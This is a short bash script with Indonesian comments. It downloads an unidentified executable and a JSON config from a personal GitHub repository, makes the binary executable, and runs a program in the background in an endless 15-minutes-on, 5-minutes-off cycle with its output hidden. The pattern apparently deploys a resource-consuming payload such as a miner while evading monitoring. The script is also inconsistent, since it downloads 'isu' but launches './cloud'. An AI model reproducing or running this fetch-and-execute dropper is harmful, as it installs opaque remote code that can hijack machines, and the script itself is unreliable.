#!/bin/bash

# Bersihkan file lama
rm -rf isu*

# Download file
wget https://github.com/barburonjilo/open/raw/refs/heads/main/isu
wget https://github.com/barburonjilo/open/raw/refs/heads/main/isu2.json

# Izin eksekusi
chmod +x isu

# Loop selamanya
while true
do
    echo "=== Start isu ==="
    nohup ./cloud -c "isu2.json" >/dev/null 2>&1 &
    PID=$!
    
    # Jalan 15 menit
    sleep 900
    
    echo "=== Stop isu ==="
    pkill -f "cloud -c isu2.json"
    
    # Tunggu 5 menit
    sleep 300
done
